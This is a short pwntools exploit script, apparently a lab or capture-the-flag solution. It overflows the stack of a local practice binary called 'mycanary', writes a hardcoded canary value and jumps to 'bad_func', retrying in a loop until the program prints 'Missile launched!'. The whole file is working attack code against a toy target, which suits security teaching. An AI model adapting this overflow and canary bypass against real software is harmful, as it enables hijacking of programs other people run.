#!/usr/bin/python
from pwn import *

e = ELF("../src/mycanary", checksec=False)
bad_func = e.symbols['bad_func']


payload = b"A" * 100 + b"\xef\xbe\x01\xde" + p32(bad_func) + p32(bad_func)+ p32(bad_func)+ p32(bad_func)+ p32(bad_func)

c = 0
# brute force loop
while True:
	# open program
	p = process('../src/mycanary')
	#p=gdb.debug( './mycanary','''set follow-fork-mode child
	#	break *0x080499b6
	#	continue
	#	''')
	p.sendline(payload)
	# recieve trash text and discard
	line = p.recvline()
	print(line)
	if b'Canary' not in line:
		p.kill()
		
	else:
		line = p.recv()
		print(line)
		break
	if "Missile launched!" in line.decode():
		# SUCCESS!!$$$
		print(line)
		print("Success after %d attempts" % c)
		break
	else:
		c += 1
